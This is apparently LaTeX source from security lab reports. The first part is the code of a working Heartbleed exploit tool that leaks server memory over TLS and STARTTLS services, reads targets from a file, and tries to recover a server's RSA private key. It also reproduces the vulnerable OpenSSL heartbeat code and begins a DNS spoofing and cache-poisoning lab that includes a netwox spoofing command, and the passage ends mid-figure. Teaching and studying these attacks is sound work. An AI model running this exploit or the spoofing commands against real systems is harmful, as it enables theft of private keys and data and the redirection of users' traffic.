0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,

# Extension: SessionTicket TLS
0x00, 0x23, 0x00, 0x00,

# Extension: Heartbeat
0x00, 0x0f, 0x00, 0x01, 0x01
    ]
    return client_hello

def build_heartbeat(tls_ver):
    heartbeat = [
0x18,       # Content Type (Heartbeat)
0x03, tls_ver,  # TLS version
0x00, 0x29,  # Length

# Payload
0x01,       # Type (Request)
opts.len/256, opts.len%256,  # Payload length
0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
0x41, 0x41, 0x41, 0x41, 0x41, 0x42, 0x43, 0x44,
0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
0x4E, 0x4F
    ] 
    return heartbeat

if opts.rawoutfile:
    rawfileOUT = open(opts.rawoutfile, "a")

if opts.asciioutfile:
    asciifileOUT = open(opts.asciioutfile, "a")

if opts.extractkey:
    opts.donotdisplay = True

def hexdump(s):
    pdat = ''
    hexd = ''
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        if opts.hexdump:
            hxdat = ' '.join('%02X' % ord(c) for c in lin)
            pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
            hexd += '  %04x: %-48s %s\n' % (b, hxdat, pdat)
        else:
            pdat += ''.join((c if ((32 <= ord(c) <= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin)

    if opts.hexdump:
	    return hexd

    else:
        pdat = re.sub(r'([.]{50,})', '', pdat)
        if opts.asciioutfile:
            asciifileOUT.write(pdat)
        return pdat



def rcv_tls_record(s):
    print 'Analyze the result....'
    try:
        tls_header = s.recv(5)
        if not tls_header:
            print 'Unexpected EOF (header)' 
            return None,None,None        
        typ,ver,length = struct.unpack('>BHH',tls_header)
        message = ''
        while len(message) != length:
            message += s.recv(length-len(message))

        if not message:
            print 'Unexpected EOF (message)'
            return None,None,None

        if opts.verbose:
	        print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)

        return typ,ver,message

    except Exception as e:
        print "\nError Receiving Record! " + str(e)
        return None,None,None

def hit_hb(s, targ, firstrun, supported):
    s.send(hex2bin(build_heartbeat(supported)))
    while True:
        typ, ver, pay = rcv_tls_record(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return ''

        if typ == 24:
            if opts.verbose:
                print 'Received heartbeat response...'
            if len(pay) > 0x29:
                if firstrun or opts.verbose:
                    print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'
                if opts.rawoutfile:
                    rawfileOUT.write(pay)
                if opts.extractkey:
                	return pay
                else:
	                return hexdump(pay)
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'

        if typ == 21:
            print 'Received alert:'
            return hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return ''

def conn(targ, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sys.stdout.flush()
        s.settimeout(10)
        #time.sleep(0.2)
        s.connect((targ, port))
        return s

    except Exception as e:
       print "Connection Error! " + str(e)
       return None

def bleed(targ, port):
    try:
        res = ''
        firstrun = True
        print '\n##################################################################'
        print 'Connecting to: ' + targ + ':' + str(port) + ', ' + str(opts.num) + ' times'
        for x in range(0, opts.num):
            if x > 0:
                firstrun = False

            if x == 0 and opts.extractkey:
                print "Attempting to extract private key from returned data..."
                if not os.path.exists('./hb-certs'):
                    os.makedirs('./hb-certs')
                print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'
                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')	
                print '\nExtracting modulus from cert...\n'
                os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem > hb-certs/sslcert_' + targ + '_pubkey.pem')
                output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')
                modulus = output.read()

            s = conn(targ, port)
            if not s:
                continue

            # send starttls command if specified as an option or if common smtp/pop3/imap ports are used
            if (opts.starttls) or (port in {25, 587, 110, 143, 21}):        
                stls = False
                atls = False

                # check if smtp supports starttls/stls
                if port in {25, 587}:
                    print 'SMTP Port... Checking for STARTTLS Capability...'
                    check = s.recv(1024)
                    s.send("EHLO someone.org\n")
                    sys.stdout.flush()
                    check += s.recv(1024)
                    if opts.verbose:
                        print check

                    if "STARTTLS" in check:
                        opts.starttls = True
                        print "STARTTLS command found"

                    elif "STLS" in check:
                        opts.starttls = True
                        stls = True
                        print "STLS command found"

                    else:
                        print "STARTTLS command NOT found!"
                        print '##################################################################'
                        return

                # check if pop3/imap supports starttls/stls                            
                elif port in {110, 143}:
                    print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'
                    check = s.recv(1024)
                    if port == 110:
                        s.send("CAPA\n")
                    if port == 143:
                        s.send("CAPABILITY\n")
                    sys.stdout.flush()
                    check += s.recv(1024)
                    if opts.verbose:
                        print check
                    if "STARTTLS" in check:
                        opts.starttls = True
                        print "STARTTLS command found"
                    elif "STLS" in check:
                        opts.starttls = True
                        stls = True
                        print "STLS command found"
                    else:
                        print "STARTTLS command NOT found!"
                        print '##################################################################'
                        return

                # check if ftp supports auth tls/starttls                          
                elif port in {21}:
                    print 'FTP Port... Checking for AUTH TLS Capability...'
                    check = s.recv(1024)
                    s.send("FEAT\n")
                    sys.stdout.flush()
                    check += s.recv(1024)
                    if opts.verbose:
                        print check
                    if "STARTTLS" in check:
                        opts.starttls = True
                        print "STARTTLS command found"
                    elif "AUTH TLS" in check:
                        opts.starttls = True
                        atls = True
                        print "AUTH TLS command found"
                    else:
                        print "STARTTLS command NOT found!"
                        print '##################################################################'
                        return     

                # send appropriate tls command if supported                        
                if opts.starttls:       
                    sys.stdout.flush()
                    if stls:
                        print 'Sending STLS Command...'
                        s.send("STLS\n")
                    elif atls:
                        print 'Sending AUTH TLS Command...'
                        s.send("AUTH TLS\n")
                    else:
                        print 'Sending STARTTLS Command...'
                        s.send("STARTTLS\n")
                    if opts.verbose:
                        print 'Waiting for reply...'
                    sys.stdout.flush()
                    rcv_tls_record(s)

            supported = False
            for num,tlsver in tls_versions.items():

                if firstrun:
                    print 'Sending Client Hello for {}'.format(tlsver)
                s.send(hex2bin(build_client_hello(num)))

                if opts.verbose:
                    print 'Waiting for Server Hello...'

                while True:
                    typ,ver,message = rcv_tls_record(s)
                    if not typ:
                        if opts.verbose:
                            print 'Server closed connection without sending ServerHello for {}'.format(tlsver)
                        s.close()
                        s = conn(targ, port)
                        break
                    if typ == 22 and ord(message[0]) == 0x0E:
                        if firstrun:
                            print 'Received Server Hello for {}'.format(tlsver)
                        supported = True
                        break
                if supported: break

            if not supported:
                print '\nError! No TLS versions supported!'
                print '##################################################################'
                return

            if opts.verbose:
                print '\nSending heartbeat request...'
            sys.stdout.flush()

            keyfound = False
            if opts.extractkey:
            	res = hit_hb(s, targ, firstrun, supported)
            	if res == '':
            	    continue
            	keyfound = extractkey(targ, res, modulus)
            else:
	            res += hit_hb(s, targ, firstrun, supported)
            s.close()
            if keyfound:
                sys.exit(0)
            else:
                sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))
                sys.stdout.flush()

        print '\n##################################################################'
        print       
        return res

    except Exception as e:
       print "Error! " + str(e)
       print '##################################################################'
       print               

def extractkey(host, chunk, modulus):
    #print "\nChecking for private key...\n"
    n = int (modulus, 16)
    keysize = n.bit_length() / 16

    for offset in xrange (0, len (chunk) - keysize):
        p = long (''.join (["%02x" % ord (chunk[x]) for x in xrange (offset + keysize - 1, offset - 1, -1)]).strip(), 16)
        if gmpy.is_prime (p) and p != n and n % p == 0:
            if opts.verbose:
                print '\n\nFound prime: ' + str(p)
            e = 65537
            q = n / p
            phi = (p - 1) * (q - 1)
            d = gmpy.invert (e, phi)
            dp = d % (p - 1)
            dq = d % (q - 1)
            qinv = gmpy.invert (q, p)
            seq = Sequence()
            for x in [0, n, e, d, p, q, dp, dq, qinv]:
                seq.setComponentByPosition (len (seq), Integer (x))
            print "\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" % base64.encodestring(encoder.encode (seq))
            privkeydump = open("hb-certs/privkey_" + host + ".dmp", "a")
            privkeydump.write(chunk)
            return True

        else:
            return False

def main():
    print "\ndefribulator v1.20"
    print "A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)"
    allresults = ''

    # if a file is specified, loop through file
    if opts.filein:
        fileIN = open(opts.filein, "r")

        for line in fileIN:
            targetinfo = line.strip().split(":")
            if len(targetinfo) > 1:
                allresults = bleed(targetinfo[0], int(targetinfo[1]))
            else:
                allresults = bleed(targetinfo[0], opts.port)

            if allresults and (not opts.donotdisplay):
                print '%s' % (allresults)
        fileIN.close()

    else:
        if len(args) < 1:
            options.print_help()
            return
        allresults = bleed(args[0], opts.port)
        if allresults and (not opts.donotdisplay):
            print '%s' % (allresults)

    print

    if opts.rawoutfile:
        rawfileOUT.close()

    if opts.asciioutfile:
        asciifileOUT.close()

if __name__ == '__main__':
    main()
\end{minted}
\clearpage
\subsection{OpenSSL.c}
\begin{minted}[linenos,breaklines]{C}
/* Allocate memory for the response, size is 1 byte
 * message type, plus 2 bytes payload length, plus
 * payload, plus padding
 */

unsigned int payload;
unsigned int padding = 16; /* Use minimum padding */

// Read from type field first
hbtype = *p++; /* After this instruction, the pointer
               * p will point to the payload_length field. */

// Read from the payload_length field
// from the request packet
n2s(p, payload); /* Function n2s(p, payload) reads 16 bits
                * from pointer p and store the value
                * in the INT variable "payload". */

pl=p; // pl points to the beginning of the payload content

if (hbtype == TLS1_HB_REQUEST)
{
	unsigned char *buffer, *bp;
	int r;

	/* Allocate memory for the response, size is 1 byte
	* message type, plus 2 bytes payload length, plus
	* payload, plus padding
	*/

	buffer = OPENSSL_malloc(1 + 2 + payload + padding);
	bp = buffer;

	// Enter response type, length and copy payload
	*bp++ = TLS1_HB_RESPONSE;
	s2n(payload, bp);

	// copy payload
	memcpy(bp, pl, payload); /* pl is the pointer which
	                     * points to the beginning
	                     * of the payload content */

	bp += payload;

	// Random padding
	RAND_pseudo_bytes(bp, padding);

	// this function will copy the 3+payload+padding bytes
	// from the buffer and put them into the heartbeat response
	// packet to send back to the request client side.
	OPENSSL_free(buffer);
	r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer,
	3 + payload + padding);
}
\end{minted}

%PDF 3: Local DNS Attack%
\begin{titlepage}
		\begin{center}
		\vspace*{27em}
		\Huge
			\textbf{Local DNS Attack}
			\vfill
		\end{center}
	\end{titlepage}
	
	\pagenumbering{roman}
	\newpage
	\pagenumbering{arabic}
	\setcounter{section}{0}
	\section{Introduction}
	The Domain Name System (DNS) is used to translate hostnames to IP addresses. This process is termed as DNS resolution, which is transparent to users. However, there are attacks that can be mounted against the DNS resolution process which can redirect the user away from a legitimate to a malicious site, also known as DNS Pharming attacks.
\section{Overview}
This lab will focus on the effects of the HOSTS file on the redirection of any request, manipulation of the DNS cache of both on the user's system in the second task and on the DNS server in the third task as a more effective measure. Using any of the three attacks will render the user vulnerable, with the potential of exposing this to a greater number of systems if it was performed on a DNS server such as an Internet Service Provider (ISP) and was successful.
\newpage
\section{Attack Sequence}
\subsection{Virtual Machine (VM) Preparation}
\subsubsection{Network Setup}\begin{par}
In the following lab, 3 VMs are configured in the layout shown in Figure \ref{fig:Networksetup}. The figure also displays how a local network is connected to the wider internet and how domains are resolved.\end{par}
\begin{figure}[H]
			\centering
			\begin{tikzpicture}
			\draw[fill=red!10] (-1.05,2.15) rectangle (0.25,1.25);
			\draw (-1.2,2.3) rectangle (0.4,1.1);
			\draw (0,1.1) rectangle (-0.8,0.6);
			\draw (-1,0.75) -- (-1.4,0.4);
			\draw (0.2,0.75) -- (0.6,0.4);
			\draw (-1.4,0.4) -- (0.6,0.4);
			\draw (-1,0.75) -- (-0.8,0.75);
			\draw (0.2,0.75) -- (0,0.75);
			\draw (-0.4,-0.3) node[text width=3cm,align=center]{Attacker\\192.168.43.156};
			
			
			\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
			\draw (-5.3,2.3) rectangle (-3.7,1.1);
			\draw (-4.1,1.1) rectangle (-4.9,0.6);
			\draw (-5.1,0.75) -- (-5.5,0.4);
			\draw (-3.9,0.75) -- (-3.5,0.4);
			\draw (-5.5,0.4) -- (-3.5,0.4);
			\draw (-5.1,0.75) -- (-4.9,0.75);
			\draw (-3.9,0.75) -- (-4.1,0.75);
			\draw (-4.5,-0.3) node[text width=3cm, align=center]{User\\192.168.43.154};
			
				\draw[fill=green!10] (3.05,2.15) rectangle (4.35,1.25);
			\draw (2.9,2.3) rectangle (4.5,1.1);
			\draw (4.1,1.1) rectangle (3.3,0.6);
			\draw (3.1,0.75) -- (2.7,0.4);
			\draw (4.3,0.75) -- (4.7,0.4);
			\draw (2.7,0.4) -- (4.7,0.4);
			\draw (3.1,0.75) -- (3.3,0.75);
			\draw (4.3,0.75) -- (4.1,0.75);
			\draw (3.7 ,-0.3) node[text width=3cm, align=center]{DNS Server\\192.168.43.157};
			
			\draw (3.7,-0.8) -- (3.7,-2.4);
			\draw (-4.5,-0.8) -- (-4.5,-2.4);
			\draw (-0.4,-0.8) -- (-0.4,-3.7);
			\draw (3.7,-2.4) -- (0.4,-3.95);
			\draw (-4.5,-2.4)--(-1.2,-3.95);
			\draw[densely dotted, line width=0.3mm](-4.5,-1.5) -- (3.7,-1.5);
			
			
			\draw[fill=yellow!10] (-1.05,-3.85) rectangle (0.25,-4.75);
			\draw (-1.2,-3.7) rectangle (0.4,-4.9);
			\draw (0,-4.9) rectangle (-0.8,-5.4);
			\draw (-1,-5.25) -- (-1.4,-5.6);
			\draw (0.2,-5.25) -- (0.6,-5.6);
			\draw (-1.4,-5.6) -- (0.6,-5.6);
			\draw (-1,-5.25) -- (-0.8,-5.25);
			\draw (0.2,-5.25) -- (0,-5.25);
			\draw (-0.4,-6.3) node[text width=3cm,align=center]{Gateway\\192.168.43.2};
			
			\draw[rounded corners=8pt] (-6,2.65) rectangle (5.3,-7.1);
			
			\draw[<->,>=stealth',line width=0.5mm] (-0.3,-6.76) -- (-0.3, -8.7);
			
			\draw[rounded corners=8pt] (-6,-8.7) rectangle (5.3,-11.2);
			
			\draw (-3.4,-7.5) node[align=left]{Local Area Network (LAN)};
			\draw (-5.14,-8.35) node[align=left]{Internet};
			
			\draw [rounded corners=8pt] (-5.5,-9.2) rectangle node[text width=3cm, align=center]{Root\\DNS Server} (-2.4, -10.7);
			\draw [rounded corners=8pt] (-1.9,-9.2) rectangle node[text width=3cm, align=center]{\texttt{.COM}\\DNS Server} (1.2, -10.7);
			\draw [rounded corners=8pt] (1.7,-9.2) rectangle node[text width=3cm, align=center]{\texttt{example.com}\\DNS Server} (4.8, -10.7);
				\end{tikzpicture}
			\caption{Network Topology}
			\label{fig:Networksetup}
		\end{figure}
		\subsubsection{Installing DNS server}
		\begin{par} The DNS server that will be used on Ubuntu is \texttt{BIND9} and can be installed using the following line.
		\end{par}
		\begin{verbatim}
		$ sudo apt-get install bind9
		\end{verbatim}
		\subsubsection{Creating domain configuration files}
		\begin{par}
		For the DNS server to function, the configuration file \texttt{named.conf} needs to be present and reads additional files such as \texttt{named.conf.options}, all located in the folder \texttt{/etc/bind/}. The following lines are added so that the DNS server's cache dump can be read.
		\end{par}
		\begin{verbatim}
		options {
		    dump-file    "/var/cache/bind/dump.db";
		};
		\end{verbatim}
		\subsubsection{Creating zones}
		\begin{par} Each domain to be used on the server requires a zone file. This file provides answers on the domain that is being queried, in this lab \texttt{example.com}. The domain \texttt{example.com} is used to provide illustrative examples in documents and has no ownership, hence safe to us for this lab. The following lines are added to the file \texttt{/etc/bind/named.conf}.
		\end{par}
		\begin{verbatim}
		zone "example.com" {
		    type master;
		    file "/var/cache/bind/example.com.db";
		    };
		    
		zone "43.168.192.in-addr.arpa" {
		    type master;
		    file "/var/cache/bind/192.168.43";
		    };
		\end{verbatim}
		*Note: \texttt{in-addr.arpa} is used for the reverse mapping of IP addresses to hostnames and hence requires IP address to be specified in reverse order when declaring zones.
		\subsubsection{Setting up zone files}
		\begin{par}
		Zone files are required for DNS resolution to the respective domain names. Each zone  contains resource records which must contain a Start of Authority (SOA) record and followed with additional options such as Address (A) record, which specifies the IP\textbf{v4} address where this domain is located on. Other records that are mainly specified include NameServer (NS), Mail eXchange (MX), TeXT (TXT) records. There are instances where other records which are not mandatory that may appear, such as AAAA and CNAME records. The full list of records can be found on \href{https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml}{IANA's page}.\\\\The following zone files is used to configure \texttt{example.com}
		\end{par}
		\begin{verbatim}
		$TTL 3D
		@        IN    SOA    ns.example.com. admin.example.com. (
		         2008111001 ;serial, today's date + today's serial number
		         8H         ;refresh, seconds
		         2H         ;retry, seconds
		         4W         ;expire, seconds
		         1D)        ;minimum, seconds
		
		@        IN    NS    ns.example.com. ; Address of nameserver
		@        IN    MX    10 mail.example.com. ;Primary Mail Exchanger
		
		www      IN    A     192.168.43.101 ;Address of www.example.com
		mail     IN    A     192.168.43.102 ;Address of mail.example.com
		ns       IN    A     192.168.43.157 ;Address of ns.example.com
		*.example.com  IN  A 192.168.13.100 ;Address for other URL in 
		                                    ;example.com. domain
		\end{verbatim}
		A reverse DNS lookup file is also needed for IP address zone 192.168.43 for \texttt{example.com}
		\begin{verbatim}
		$TTL 3D
		@        IN    SOA    ns.example.com. admin.example.com. (
		               2008111001
		               8H
		               2H
		               4W
		               1D)
		@        IN    NS    ns.example.com.
		101      IN    PTR   www.example.com.
		102      IN    PTR   mail.example.com.
		10       IN    PTR   ns.example.com.
		\end{verbatim}
		\subsubsection{Starting the DNS server}
		To start the \texttt{BIND9} DNS server, the following command is executed in Terminal.
		\begin{verbatim}
		$sudo service bind9 restart
		\end{verbatim}
		\subsubsection{Configuring User Machine}
		\begin{par}
		On the user's machine, the default DNS server needs to be amended. This is done by changing the \texttt{resolv.conf} file. The following single line is added to the file.\end{par} 
		\begin{verbatim}
		nameserver 192.168.43.157 #IP address of server just setup
		\end{verbatim}
		\begin{par}
		Additionally, the changes made might be overwritten by the DHCP client and needs to be avoided to complete the lab properly. To do so, the DNS server address on our wired connection (Under IPv4 settings) is manually and explicitly defined. To refresh the connection and ensure that the changes take effect immediately, the name of our connection ``Wired connection 1" is clicked to force refresh the network.
		\end{par}
		\subsubsection{Checking of Output}
		\begin{par}
		To check if the server and the user has been configured correctly. The command \texttt{dig} is used to obtain information about the domain when a domain query has been issued to the DNS nameserver.
		\begin{verbatim}
		$ dig example.com
		\end{verbatim}
		The output will display common details such as the IP address of the domain and nameserver and TTL (Time-To-Live) of the DNS server.
		
\begin{figure}[H]
\centering
\includegraphics[width=0.85\linewidth]{dig}
\caption{Expected Output of DNS Server}
\label{fig:dig}
\end{figure}
		\end{par}
		\newpage
		\subsection{System Compromised}
		\begin{par}Assuming that the attackers have gained control over the system, this task will focus on the modification of the HOSTS file. Using the HOSTS file for hostname redirection ignores any DNS lookups. For this task, \texttt{example.com} has been redirected to some random IP address. From Figure \ref{fig:dig}, it is known that the site \texttt{www.example.com} has IP address 192.168.43.101 and can be checked by running the command \texttt{ping www.example.com}. \\\\The IP address is modified to reflect 1.2.3.4 in the HOSTS file, located at the directory \texttt{/etc/hosts} and pinged to show the effect.\end{par}
		\begin{figure}[H]
		    \centering
		    \begin{subfigure}[h]{0.49\textwidth}
		        \centering
		        \includegraphics[width=1\linewidth]{beforehost}
		        \caption{Before HOSTS Edit}
		    \end{subfigure}%
		    ~ 
		    \begin{subfigure}[h]{0.49\textwidth}
		        \centering
		        \includegraphics[width=1\linewidth]{afterhost}
		        \caption{After HOSTS Edit}
		    \end{subfigure}
		    \caption{Effect on HOSTS Edit}
		    \label{fig:hostsfile}
		\end{figure}
		\vspace{1em}
		\begin{par}
		\noindent As shown in Figure \ref{fig:hostsfile}, any entry in the HOSTS file takes precedence over the DNS lookup via the DNS server any attempt to establish a connection to an affected domain will result in a redirection that the user may not be aware if an attacker has modified the system.
		\end{par}
		\subsection{Spoofing User Response}
		\begin{par}
		For this section, the user's system is not compromised by the attacker. However, attackers will still be able to listen to the network and spoof a DNS request issued by the user. By this method, the system will acknowledge the fake DNS response and be redirected to the malicious domain. Figure \ref{fig:SpoofUserRes} provides a graphical overview on the flow of the DNS spoofing attack.
		
		\begin{figure}[H]
					\centering
					\begin{tikzpicture}
					\draw[fill=green!10] (3.05,-0.85) rectangle (4.35,-1.75);
					\draw (2.9,-0.7) rectangle (4.5,-1.9);
					\draw (4.1,-1.9) rectangle (3.3,-2.4);
					\draw (3.1,-2.25) -- (2.7,-2.6);
					\draw (4.3,-2.25) -- (4.7,-2.6);
					\draw (2.7,-2.6) -- (4.7,-2.6);
					\draw (3.1,-2.25) -- (3.3,-2.25);
					\draw (4.3,-2.25) -- (4.1,-2.25);
					\draw (3.7 ,-3.3) node[text width=3cm,align=center]{DNS Server};
					
					
					\draw[fill=blue!10] (-5.15,-0.85) rectangle (-3.85,-1.75);
					\draw (-5.3,-0.7) rectangle (-3.7,-1.9);
					\draw (-4.1,-1.9) rectangle (-4.9,-2.4);
					\draw (-5.1,-2.25) -- (-5.5,-2.6);
					\draw (-3.9,-2.25) -- (-3.5,-2.6);
					\draw (-5.5,-2.6) -- (-3.5,-2.6);
					\draw (-5.1,-2.25) -- (-4.9,-2.25);
					\draw (-3.9,-2.25) -- (-4.1,-2.25);
					\draw (-4.5,-3.3) node[text width=3cm, align=center]{User};
					
						\draw[fill=red!10] (3.05,2.15) rectangle (4.35,1.25);
					\draw (2.9,2.3) rectangle (4.5,1.1);
					\draw (4.1,1.1) rectangle (3.3,0.6);
					\draw (3.1,0.75) -- (2.7,0.4);
					\draw (4.3,0.75) -- (4.7,0.4);
					\draw (2.7,0.4) -- (4.7,0.4);
					\draw (3.1,0.75) -- (3.3,0.75);
					\draw (4.3,0.75) -- (4.1,0.75);
					\draw (3.7 ,-0.3) node[text width=3cm, align=center]{Attacker};
					
					\draw[rounded corners=8pt] (-6,2.65) rectangle (5.3,-4.1);
					
					\draw[<->,>=stealth',line width=0.5mm] (3.7,-3.6) -- (-0.3, -5.7);
					
					\draw[rounded corners=8pt] (-6,-5.7) rectangle (5.3,-8.2);
					
					\draw (-3.4,-4.5) node[align=left]{Local Area Network (LAN)};
					\draw (-5.14,-5.35) node[align=left]{Internet};
					
					\draw [rounded corners=8pt] (-5.5,-6.2) rectangle node[text width=3cm, align=center]{Root\\DNS Server} (-2.4, -7.7);
					\draw [rounded corners=8pt] (-1.9,-6.2) rectangle node[text width=3cm, align=center]{\texttt{.COM}\\DNS Server} (1.2, -7.7);
					\draw [rounded corners=8pt] (1.7,-6.2) rectangle node[text width=3cm, align=center]{\texttt{example.com}\\DNS Server} (4.8, -7.7);
					
					\draw[->,>=stealth',line width=0.4mm](-3.7,-1.1) --(0,-1.1);
					\draw[line width=0.4mm] (-0.3,-1.1)--(2.9,-1.1);
					\draw[bend left, line width=0.4mm, densely dotted] (0.5,-1.1) to (2.9,1.9);
					\draw[-<,>=stealth',line width=0.4mm](-3.7,-1.5) --(0,-1.5);
					\draw[line width=0.4mm](-0.1,-1.5) --(0.8,-1.5);
					\draw[line width=0.4mm, densely dotted] (0.8,-1.5)--(2.9,-1.5);
					\draw[bend left, line width=0.4mm] (0.8,-1.5) to (2.9,1.5);
					\draw (-1.7,-0.7) node{\circled{1}};
					\draw (2,-4.9) node{\circled{3}};
					\draw (1,1) node{\circled{2}};
					\draw (-1.7,-1.9) node {\circled{4}};
					\end{tikzpicture}
					
					\begin{flushleft}
					\circled{1} User's system sends out a DNS query to the DNS server.\\
					\circled{2} The attacker listens on the DNS request from the network and processes it.\\
					\circled{3} The DNS server will query other DNS servers if the records are not cached on the server.\\
					\circled{4} Before the DNS server is able to reply, the attacker sends out its own packet to respond to the user's DNS request and spoof the DNS cache on the user's system.
					\end{flushleft}
					\centering
					
					\caption{User DNS Spoofing}
					\label{fig:SpoofUserRes}
				\end{figure}
		
		
		\noindent For a DNS response to be accepted, the following criterion must be met:\end{par}
		\begin{enumerate}
		\itemsep0em
		\item Source IP address must be the IP address of the DNS server.
		\item Destination IP address must be the IP address of the user's machine.
		\item Source port number must match the port number that the DNS request was sent to (usually UDP 53).
		\item Destination port number must match the port number that the DNS request originated from.
		\item UDP checksum must be calculated correctly.
		\item Transaction ID must be the same as the DNS request.
		\item Domain name in the question section of the reply must match the domain name in the question section of the request.
		\item Domain name in the answer section must match the domain name in the question section of the DNS request.
		\item The user's system must receive the attacker system's reply before it receives the legitimate DNS response.
		\end{enumerate}
		\begin{par}
		\noindent To perform such an operation, \texttt{netwox 105} can be used to sniff packets and send an appropriate response. To simplify the work further, we will use the GUI alternative \texttt{netwag} to fill up the required fields and generate the respective code.\end{par}
		
\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{netwag}
\caption{\texttt{Netwag} Code Generation}
\label{fig:netwag}
\end{figure}
\noindent The code generated by \texttt{netwag} is copied into Terminal. The \texttt{--filter "src host 192.168.43.154"} switch is added as the DNS request that is to be spoofed needs to originate from the user's system IP address before it can be executed in an elevated window.
\begin{verbatim}
$ sudo netwox 105 --hostname "www.example.com" --hostnameip 5.6.7.8 
  --authns "ns.example.com" --authnsip 192.168.43.157 
  --device "Eth0" --filter "src host 192.168.43.154"
\end{verbatim}
Using the user's system and executing \texttt{dig www.example.com}, we see that the answer section now reflects the modified IP address 5.6.7.8, which shows that DNS requests can be redirected even without the need of tampering with the user's system.

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{digexploit}
\caption{IP Address Changed with DNS Exploit}
\label{fig:digexploit}
\end{figure}
\subsection{Spoofing DNS Server Response}
\begin{par}
Spoofing DNS responses originating from the user's machine is inefficient as every DNS request must be intercepted. Instead, we will spoof the response from a DNS server instead. When a DNS server receives a DNS request where the hostname is not under its own domain, it will check its own cache to see if the response is there. Otherwise, the DNS server will broadcast a DNS request to other DNS servers to resolve the hostname and store the answer in its cache for faster retrieval later. \\\\Therefore, if the DNS response is spoofed at the DNS server level, the server will use its cache to reply any request later, until the cached information expires (normally 48 hours on most DNS servers).\\\\This method of spoofing the DNS request is called \textit{DNS cache poisoning}. Figure \ref{fig:SpoofServRes} below provides a graphical understanding on how the attack in this task will work.


\begin{figure}[H]
					\centering
					\begin{tikzpicture}
					\draw[fill=green!10] (3.05,2.15) rectangle (4.35,1.25);
					\draw (2.9,2.3) rectangle (4.5,1.1);
					\draw (4.1,1.1) rectangle (3.3,0.6);
					\draw (3.1,0.75) -- (2.7,0.4);
					\draw (4.3,0.75) -- (4.7,0.4);
					\draw (2.7,0.4) -- (4.7,0.4);
					\draw (3.1,0.75) -- (3.3,0.75);
					\draw (4.3,0.75) -- (4.1,0.75);
					\draw (3.7 ,-0.3) node[text width=3cm,align=center]{DNS Server};
					
					
					\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
					\draw (-5.3,2.3) rectangle (-3.7,1.1);
					\draw (-4.1,1.1) rectangle (-4.9,0.6);
					\draw (-5.1,0.75) -- (-5.5,0.4);
					\draw (-3.9,0.75) -- (-3.5,0.4);
					\draw (-5.5,0.4) -- (-3.5,0.4);
					\draw (-5.1,0.75) -- (-4.9,0.75);
					\draw (-3.9,0.75) -- (-4.1,0.75);
					\draw (-4.5,-0 .3) node[text width=3cm, align=center]{User};
					
						\draw[fill=red!10] (-1.05,-0.85) rectangle (0.25,-1.75);
					\draw (-1.2,-0.7) rectangle (0.4,-1.9);
					\draw (0,-1.9) rectangle (-0.8,-2.4);
					\draw (-1,-2.25) -- (-1.4,-2.6);
					\draw (0.2,-2.25) -- (0.6,-2.6);
